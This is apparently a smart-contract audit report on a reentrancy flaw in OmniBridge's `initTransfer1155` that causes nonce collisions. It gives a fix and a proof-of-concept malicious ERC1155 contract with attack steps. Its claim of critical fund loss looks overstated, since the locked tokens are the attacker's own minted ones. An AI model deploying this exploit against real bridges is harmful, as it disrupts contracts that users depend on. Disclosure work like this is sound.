### Title
Reentrancy in `initTransfer1155` via Malicious ERC1155 Callback Causes Nonce Collision and Permanent Fund Loss - (File: evm/src/omni-bridge/contracts/OmniBridge.sol)

### Summary
`initTransfer1155` increments `currentOriginNonce` at the start of the function but reads it again from storage at the end — after an external `safeTransferFrom` call to an untrusted ERC1155 token. A malicious ERC1155 token can reenter `initTransfer1155` during that external call, causing `currentOriginNonce` to be incremented a second time. Both the outer and inner invocations then emit `InitTransfer` events carrying the same `origin_nonce`, causing the NEAR side to reject one as a duplicate and permanently lock the corresponding tokens.

### Finding Description
In `initTransfer1155`: [1](#0-0) 

The execution order is:

1. **Line 448** — `currentOriginNonce += 1` (nonce = N, stored in contract state)
2. **Line 458–464** — `IERC1155(tokenAddress).safeTransferFrom(msg.sender, address(this), tokenId, amount, "")` — **external call to an untrusted, arbitrary ERC1155 contract**
3. **Line 471** — `initTransferExtension(..., currentOriginNonce, ...)` — reads `currentOriginNonce` from storage **after** the external call
4. **Line 483** — `emit BridgeTypes.InitTransfer(..., currentOriginNonce, ...)` — reads `currentOriginNonce` from storage **after** the external call

A malicious ERC1155 token can, inside its `safeTransferFrom` implementation, call back into `initTransfer1155` before returning. The reentrant (inner) call executes step 1 again, advancing `currentOriginNonce` to N+1. When the inner call completes it emits `InitTransfer` with nonce N+1. When the outer call resumes and reaches steps 3–4, it reads `currentOriginNonce` from storage and finds N+1 — not N — so it also emits `InitTransfer` with nonce N+1.

There is no `nonReentrant` guard on `initTransfer1155`. [2](#0-1) 

The `onERC1155Received` guard (`operator != address(this)`) only blocks unsolicited direct sends to the bridge; it does not prevent the malicious token from calling back into `initTransfer1155` during the execution of `safeTransferFrom` itself. [3](#0-2) 

The bridge accepts **any** ERC1155 token address in `initTransfer1155` — there is no whitelist.

### Impact Explanation
The NEAR bridge contract identifies each inbound transfer by `TransferId { origin_chain, origin_nonce }` and records it in `finalised_transfers` to prevent replay. [4](#0-3) 

When two `InitTransfer` events share the same `origin_nonce`, the NEAR side finalises the first and rejects the second with a duplicate-nonce error. The ERC1155 tokens locked in the bridge by the rejected transfer have no recovery path — they are permanently frozen. This satisfies the **Critical** impact criterion: permanent freezing of bridged funds.

### Likelihood Explanation
`initTransfer1155` is a public, permissionless entry point that accepts any ERC1155 token address supplied by the caller. An attacker needs only to deploy a malicious ERC1155 contract whose `safeTransferFrom` re-enters `initTransfer1155` and call the bridge with it. No privileged role, no admin compromise, and no external dependency failure is required. The attack is fully self-contained and executable by any unprivileged user.

### Recommendation
Capture `currentOriginNonce` in a local variable **before** the external call and use that local variable in `initTransferExtension` and `emit`:

```solidity
function initTransfer1155(...) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
    currentOriginNonce += 1;
    uint64 nonce = currentOriginNonce; // capture before external call

    ...

    IERC1155(tokenAddress).safeTransferFrom(msg.sender, address(this), tokenId, amount, "");

    ...

    initTransferExtension(msg.sender, deterministicToken, nonce, ...);
    emit BridgeTypes.InitTransfer(msg.sender, deterministicToken, nonce, ...);
}
```

Apply the same fix to `initTransfer` (ERC20 path), which has an identical read-after-external-call pattern and is vulnerable to ERC777 `tokensToSend`/`tokensReceived` hooks. [5](#0-4) 

Alternatively, add OpenZeppelin's `ReentrancyGuardUpgradeable` and apply `nonReentrant` to both `initTransfer` and `initTransfer1155`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {ERC1155} from "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
import {IERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

interface IBridge {
    function initTransfer1155(
        address tokenAddress, uint256 tokenId,
        uint128 amount, uint128 fee, uint128 nativeFee,
        string calldata recipient, string calldata message
    ) external payable;
}

contract MaliciousERC1155 is ERC1155 {
    IBridge public bridge;
    bool private _reentering;

    constructor(address bridge_) ERC1155("") {
        bridge = IBridge(bridge_);
    }

    // Mint tokens to attacker so the bridge call appears legitimate
    function mint(address to, uint256 id, uint256 amount) external {
        _mint(to, id, amount, "");
    }

    // Override safeTransferFrom to reenter the bridge before returning
    function safeTransferFrom(
        address from, address to, uint256 id, uint256 amount, bytes memory data
    ) public override {
        if (!_reentering) {
            _reentering = true;
            // Inner call: increments currentOriginNonce to N+1, emits InitTransfer(nonce=N+1)
            bridge.initTransfer1155(address(this), id, amount, 0, 0, "inner.near", "");
            _reentering = false;
        }
        // Satisfy the bridge's onERC1155Received check: operator must be address(bridge)
        IERC1155Receiver(to).onERC1155Received(address(bridge), from, id, amount, data);
    }
}
```

**Attack steps:**

1. Deploy `MaliciousERC1155` pointing at the bridge.
2. Mint tokens to the attacker and approve the bridge.
3. Call `bridge.initTransfer1155(malicious, tokenId, amount, 0, 0, "outer.near", "")`.
4. Outer call: `currentOriginNonce` → N. Calls `safeTransferFrom`.
5. Inner (reentrant) call: `currentOriginNonce` → N+1. Emits `InitTransfer(nonce=N+1)`.
6. Outer call resumes: reads `currentOriginNonce` = N+1. Emits `InitTransfer(nonce=N+1)`.
7. Two events with `origin_nonce = N+1` reach NEAR. One is finalised; the other is rejected. Nonce N is never emitted. Tokens from the rejected transfer are permanently locked.

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L373-437)
```text
    function initTransfer(
        address tokenAddress,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
        currentOriginNonce += 1;
        if (fee >= amount) {
            revert InvalidFee();
        }

        uint256 extensionValue;
        if (tokenAddress == address(0)) {
            if (fee != 0) {
                revert InvalidFee();
            }
            extensionValue = msg.value - amount - nativeFee;
        } else {
            extensionValue = msg.value - nativeFee;
            if (customMinters[tokenAddress] != address(0)) {
                IERC20(tokenAddress).safeTransferFrom(
                    msg.sender,
                    customMinters[tokenAddress],
                    amount
                );
                ICustomMinter(customMinters[tokenAddress]).burn(
                    tokenAddress,
                    amount
                );
            } else if (isBridgeToken[tokenAddress]) {
                BridgeToken(tokenAddress).burn(msg.sender, amount);
            } else {
                IERC20(tokenAddress).safeTransferFrom(
                    msg.sender,
                    address(this),
                    amount
                );
            }
        }

        initTransferExtension(
            msg.sender,
            tokenAddress,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message,
            extensionValue
        );

        emit BridgeTypes.InitTransfer(
            msg.sender,
            tokenAddress,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L447-490)
```text
    ) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
        currentOriginNonce += 1;
        if (fee >= amount) {
            revert InvalidFee();
        }

        address deterministicToken = deriveDeterministicAddress(
            tokenAddress,
            tokenId
        );

        IERC1155(tokenAddress).safeTransferFrom(
            msg.sender,
            address(this),
            tokenId,
            amount,
            ""
        );

        uint256 extensionValue = msg.value - nativeFee;

        initTransferExtension(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message,
            extensionValue
        );

        emit BridgeTypes.InitTransfer(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L522-535)
```text
    function onERC1155Received(
        address operator,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external view override returns (bytes4) {
        // Only accept transfers that were initiated by this contract itself
        if (operator != address(this)) {
            revert ERC1155DirectSendNotAllowed();
        }

        return this.onERC1155Received.selector;
    }
```

**File:** near/omni-bridge/src/lib.rs (L222-224)
```rust
    pub pending_transfers: LookupMap<TransferId, TransferMessageStorage>,
    pub finalised_transfers: LookupSet<TransferId>,
    pub finalised_utxo_transfers: LookupSet<UnifiedTransferId>,
```
